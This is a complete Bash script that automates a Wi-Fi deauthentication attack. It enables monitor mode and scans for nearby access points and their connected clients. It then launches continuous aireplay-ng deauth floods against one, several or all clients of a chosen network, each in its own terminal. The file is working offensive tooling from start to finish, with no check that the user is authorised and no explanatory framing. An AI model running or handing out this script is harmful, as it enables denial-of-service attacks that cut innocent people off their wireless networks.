#!/bin/bash

# --- Configuration ---
INTERFACE="wlan0mon"         # Your wireless interface name
MONITOR_INTERFACE="wlan0mon" # The monitor mode interface name (often created by airmon-ng)
SCAN_DURATION="10"          # Duration to scan for networks in seconds
CLIENT_SCAN_DURATION="15"   # Duration to scan for clients

# --- Global Variables ---
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_ESSID=""
TARGET_CLIENTS=()
RUNNING=true

# --- Functions ---

check_root() {
  if [[ $EUID -ne 0 ]]; then
    echo "Error: This script must be run with root privileges (using sudo)."
    exit 1
  fi
}

cleanup() {
  echo "Cleaning up background processes..."
  sudo killall -q airodump-ng
  sudo killall -q aireplay-ng
  echo "Attempting to restart NetworkManager..."
  sudo systemctl start NetworkManager.service &> /dev/null
  echo "Cleanup complete. NetworkManager should be back up."
}

trap cleanup EXIT SIGINT SIGTERM

enable_monitor_mode() {
  echo "Attempting to enable monitor mode on $INTERFACE..."

  # Check if the base interface is present initially
  if ! ip link show "$INTERFACE" &> /dev/null; then
    echo "Error: Wireless interface '$INTERFACE' not found."
    exit 1
  fi

  echo "Attempting to stop Network Manager..."
  sudo systemctl stop NetworkManager.service &> /dev/null
  sleep 2

  echo "Running airmon-ng check kill..."
  sudo airmon-ng check kill
  sleep 1

  echo "Starting monitor mode on $INTERFACE..."
  airmon_output=$(sudo airmon-ng start "$INTERFACE" 2>&1)
  echo "$airmon_output"

  local found_mon_interface=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}' | head -n 1)
  if [[ -z "$found_mon_interface" ]]; then
    found_mon_interface=$(echo "$airmon_output" | grep -oP 'monitor mode vif enabled for \[\w+\]\w+ on \[\w+\]\K\w+')
  fi

  if [[ -z "$found_mon_interface" ]]; then
    echo "Error: Failed to automatically detect monitor mode interface."
    read -p "Please enter the name of the monitor interface (if created) or press Enter to exit: " manual_interface
    if [[ -n "$manual_interface" ]]; then
      if iwconfig "$manual_interface" &> /dev/null && iwconfig "$manual_interface" | grep -q 'Mode:Monitor'; then
        MONITOR_INTERFACE="$manual_interface"
        echo "Using manually provided interface: $MONITOR_INTERFACE"
      else
        echo "Error: Interface '$manual_interface' is not a valid monitor interface."
        exit 1
      fi
    else
      echo "Exiting due to failure to enable or detect monitor mode."
      exit 1
    fi
  else
    MONITOR_INTERFACE="$found_mon_interface"
    echo "Monitor mode appears to be enabled on $MONITOR_INTERFACE"
  fi
}

select_target_network() {
  echo "Scanning for available Wi-Fi networks for $SCAN_DURATION seconds..."
  rm -f network_scan-*.csv

  sudo airodump-ng "$MONITOR_INTERFACE" --band bg --write network_scan --output-format csv --ignore-negative-one &
  local airodump_pid=$!
  echo "Airodump-ng started (PID: $airodump_pid), scanning..."

  sleep "$SCAN_DURATION"

  echo "Stopping network scan (PID: $airodump_pid)..."
  if ps -p $airodump_pid > /dev/null; then
    sudo kill -TERM "$airodump_pid" 2>/dev/null
    wait "$airodump_pid" 2>/dev/null
  fi
  sudo killall -q airodump-ng

  local scan_file="network_scan-01.csv"
  if [ ! -f "$scan_file" ]; then
    echo "Error: Network scan file '$scan_file' not found."
    return 1
  fi

  echo ""
  echo "Available Wi-Fi Networks (Access Points):"
  echo "-----------------------------------------"
  local count=0
  declare -A network_data

  while IFS=',' read -r bssid first_time last_time channel speed privacy cipher auth power beacons iv lan_ip len essid key; do
    if [[ "$bssid" == "BSSID" && "$first_time" == *"Station MAC"* ]]; then
      break
    fi
    bssid=$(echo "$bssid" | xargs)
    channel=$(echo "$channel" | xargs)
    essid=$(echo "$essid" | xargs)

    if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ && -n "$essid" && "$essid" != "<length: "* && "$channel" =~ ^[0-9]+$ ]]; then
      local is_processed=false
      for i in $(seq 1 $count); do
        if [[ -v network_data[$i,bssid] && "${network_data[$i,bssid]}" == "$bssid" ]]; then
          is_processed=true
          break
        fi
      done

      if ! $is_processed; then
        count=$((count + 1))
        echo "$count) BSSID: $bssid, Channel: $channel, ESSID: $essid"
        network_data[$count,bssid]="$bssid"
        network_data[$count,channel]="$channel"
        network_data[$count,essid]="$essid"
      fi
    fi
  done < "$scan_file"

  rm -f network_scan-*.csv

  if [ "$count" -eq 0 ]; then
    echo "No Access Points found in the scan."
    return 1
  fi

  read -p "Enter the number of the network you want to target: " network_choice

  if [[ "$network_choice" =~ ^[1-9][0-9]*$ && "$network_choice" -le "$count" ]]; then
    TARGET_BSSID="${network_data[$network_choice,bssid]}"
    TARGET_CHANNEL="${network_data[$network_choice,channel]}"
    TARGET_ESSID="${network_data[$network_choice,essid]}"

    if [[ -z "$TARGET_BSSID" || -z "$TARGET_CHANNEL" ]]; then
      echo "Error retrieving network data for selection $network_choice."
      return 1
    fi

    echo ""
    echo "You selected:"
    echo "  ESSID: $TARGET_ESSID"
    echo "  BSSID: $TARGET_BSSID"
    echo "  Channel: $TARGET_CHANNEL"
    return 0
  else
    echo "Invalid input. Please enter a number between 1 and $count."
    return 1
  fi
}

select_client_target() {
  if [[ -z "$TARGET_BSSID" || -z "$TARGET_CHANNEL" ]]; then
    echo "Error: Target BSSID or Channel not set."
    return 1
  fi

  echo "Scanning for connected clients on BSSID $TARGET_BSSID (Channel $TARGET_CHANNEL) for $CLIENT_SCAN_DURATION seconds..."
  rm -f client_scan-*.csv

  sudo airodump-ng "$MONITOR_INTERFACE" --bssid "$TARGET_BSSID" --channel "$TARGET_CHANNEL" --write client_scan --output-format csv --ignore-negative-one &
  local airodump_pid=$!
  echo "Airodump-ng started (PID: $airodump_pid), scanning for clients..."

  sleep "$CLIENT_SCAN_DURATION"

  echo "Stopping client scan (PID: $airodump_pid)..."
  if ps -p $airodump_pid > /dev/null; then
    sudo kill -TERM "$airodump_pid" 2>/dev/null
    wait "$airodump_pid" 2>/dev/null
  fi
  sudo killall -q airodump-ng

  local scan_file="client_scan-01.csv"
  if [ ! -f "$scan_file" ]; then
    echo "Error: Client scan file '$scan_file' not found."
    return 1
  fi

  local -a client_array=()
  local -A client_macs_seen=()
  local count=0

  echo ""
  echo "Connected Clients:"
  echo "------------------"

  local reading_clients=false
  while IFS=',' read -r col1 col2 col3 col4 col5 col6 col7 col8 col9 || [[ -n "$col1" ]]; do
    local trimmed_col1=$(echo "$col1" | xargs)
    local trimmed_col2=$(echo "$col2" | xargs)

    if ! $reading_clients ; then
      if [[ "$trimmed_col1" == "BSSID" && "$trimmed_col2" == "First time seen" ]]; then
        continue
      fi
      if [[ "$trimmed_col1" == "Station MAC" && "$trimmed_col2" == "First time seen" ]]; then
        reading_clients=true
        continue
      fi
      if [[ "$trimmed_col1" == "BSSID" && "$trimmed_col2" == "Station MAC" ]]; then
        reading_clients=true
        continue
      fi
    fi

    if $reading_clients; then
      local station_mac=$(echo "$col1" | xargs)
      local bssid=$(echo "$col6" | xargs)
      local target_bssid_trimmed=$(echo "$TARGET_BSSID" | xargs)

      local is_mac_valid=false
      if [[ "$station_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        is_mac_valid=true
      fi

      if [[ "$bssid" == "$target_bssid_trimmed" && "$is_mac_valid" == true ]]; then
        if [[ -z "${client_macs_seen[$station_mac]}" ]]; then
          count=$((count + 1))
          echo "$count) MAC: $station_mac"
          client_array+=("$station_mac")
          client_macs_seen["$station_mac"]=1
        fi
      fi
    fi
  done < "$scan_file"

  rm -f client_scan-*.csv

  if [ ${#client_array[@]} -eq 0 ]; then
    echo "No clients found connected to BSSID $TARGET_BSSID."
    return 1
  fi

  echo ""
  read -p "Do you want to deauthenticate a specific client (s) or all connected clients (a)? [s/a]: " choice
  TARGET_CLIENTS=()
  local valid_selection=false

  case "$choice" in
    s|S)
      read -p "Enter the number of the client to target (or comma-separated numbers for multiple): " client_numbers
      IFS=',' read -ra targets <<< "$client_numbers"

      for index_str in "${targets[@]}"; do
        index_str=$(echo "$index_str" | xargs)
        if [[ "$index_str" =~ ^[1-9][0-9]*$ ]] && (( index_str >= 1 )) && (( index_str <= ${#client_array[@]} )); then
          local index=$((index_str - 1))
          local mac_to_add="${client_array[$index]}"
          local already_added=false
          for existing_mac in "${TARGET_CLIENTS[@]}"; do
            if [[ "$existing_mac" == "$mac_to_add" ]]; then
              already_added=true
              break
            fi
          done
          if ! $already_added; then
            TARGET_CLIENTS+=("$mac_to_add")
            valid_selection=true
          fi
        else
          echo "Warning: Invalid client number '$index_str'. Ignoring."
        fi
      done

      if ! $valid_selection; then
        echo "No valid clients selected."
        return 1
      fi
      echo "Selected clients for deauth: ${TARGET_CLIENTS[*]}"
      return 0
      ;;
    a|A)
      TARGET_CLIENTS=("${client_array[@]}")
      echo "Targeting all ${#TARGET_CLIENTS[@]} connected clients."
      if [ ${#TARGET_CLIENTS[@]} -gt 0 ]; then
        return 0
      else
        echo "Internal error: Tried to target all, but client list was empty."
        return 1
      fi
      ;;
    *)
      echo "Invalid choice. Please enter 's' or 'a'."
      return 1
      ;;
  esac
}

deauth_client_new_terminal() {
  local client_mac="$1"
    if [[ -z "$TARGET_BSSID" || -z "$MONITOR_INTERFACE" ]]; then
      echo "Error: Target BSSID or Monitor Interface not set. Cannot launch deauth."
      return 1
    fi
  echo "Opening a new terminal to deauthenticate client '$client_mac' from BSSID '$TARGET_BSSID'..."
  export TARGET_BSSID MONITOR_INTERFACE client_mac
  gnome-terminal --tab --title="Deauth $client_mac" -- bash -c \
    'echo "--- Starting Deauthentication Attack ---"; \
     echo "Target AP (BSSID): $TARGET_BSSID"; \
     echo "Target Client (MAC): $client_mac"; \
     echo "Interface: $MONITOR_INTERFACE"; \
     echo "Command: sudo aireplay-ng --deauth 0 -a \"$TARGET_BSSID\" -c \"$client_mac\" \"$MONITOR_INTERFACE\""; \
     sudo aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$client_mac" "$MONITOR_INTERFACE"; \
     echo "--- Deauth command finished or was interrupted. Press Enter to close this terminal. ---"; \
     read' &
}

deauth_selected_clients() {
  if [ ${#TARGET_CLIENTS[@]} -eq 0 ]; then
    echo "No clients were selected for deauthentication."
    return
  fi

  echo "Starting deauthentication attacks for ${#TARGET_CLIENTS[@]} selected client(s)..."
  for client_mac_addr in "${TARGET_CLIENTS[@]}"; do
    deauth_client_new_terminal "$client_mac_addr"
    sleep 0.5
  done
  echo "Deauthentication attacks started in new terminals."
  echo "You can close those terminals individually to stop the attack for that specific client."
}

# --- Main Script ---

check_root

enable_monitor_mode

echo "Monitor mode enabled on $MONITOR_INTERFACE."

# Select Target Network
if select_target_network; then
  echo "Target network selected successfully."
  echo "Waiting a few seconds before scanning for clients..."
  sleep 3

  # Select Client(s)
  if select_client_target; then
    echo "Client selection complete."
    # Perform Deauthentication
    deauth_selected_clients
    echo "Deauthentication attacks started in new terminals."
    echo "This main script will now wait until you type 'q' and press Enter to quit."

    while read -r input; do
      if [[ "$input" == "q" ]]; then
        echo "Exiting script."
        break
      fi
      echo "Type 'q' and press Enter to quit."
    done
  else
    echo "Failed to select clients or no clients found/chosen. Exiting."
  fi
else
  echo "Failed to select a target network or no networks found. Exiting."
fi

echo "Script finished."
exit 0
